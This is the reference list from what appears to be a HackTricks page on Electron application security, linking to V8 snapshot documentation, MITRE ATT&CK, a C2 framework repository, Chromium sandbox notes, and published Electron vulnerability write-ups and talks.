- [V8 custom startup snapshots](https://v8.dev/blog/custom-startup-snapshots)
- [electron/mksnapshot](https://github.com/electron/mksnapshot)
- [MITRE ATT&CK T1218.015](https://attack.mitre.org/techniques/T1218/015/)
- [Loki C2](https://github.com/boku7/Loki/)
- [Chromium: Disable loading of unsigned code (CIG)](https://chromium.googlesource.com/chromium/src/+/refs/heads/lkgr/docs/design/sandbox.md#disable-loading-of-unsigned-code-cig)
- [Chrome security FAQ: physically local attacks out of scope](https://chromium.googlesource.com/chromium/src/+/HEAD/docs/security/faq.md#why-arent-physically-local-attacks-in-chromes-threat-model)

- [https://shabarkin.medium.com/unsafe-content-loading-electron-js-76296b6ac028](https://shabarkin.medium.com/unsafe-content-loading-electron-js-76296b6ac028)
- [https://medium.com/@renwa/facebook-messenger-desktop-app-arbitrary-file-read-db2374550f6d](https://medium.com/@renwa/facebook-messenger-desktop-app-arbitrary-file-read-db2374550f6d)
- [https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=8](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=8)
- [https://www.youtube.com/watch?v=a-YnG3Mx-Tg](https://www.youtube.com/watch?v=a-YnG3Mx-Tg)
- [https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s](https://www.youtube.com/watch?v=xILfQGkLXQo&t=22s)
- More researches and write-ups about Electron security in [https://github.com/doyensec/awesome-electronjs-hacking](https://github.com/doyensec/awesome-electronjs-hacking)
- [https://www.youtube.com/watch?v=Tzo8ucHA5xw\&list=PLH15HpR5qRsVKcKwvIl-AzGfRqKyx--zq\&index=81](https://www.youtube.com/watch?v=Tzo8ucHA5xw&list=PLH15HpR5qRsVKcKwvIl-AzGfRqKyx--zq&index=81)
- [https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)

{{#include ../../../banners/hacktricks-training.md}}
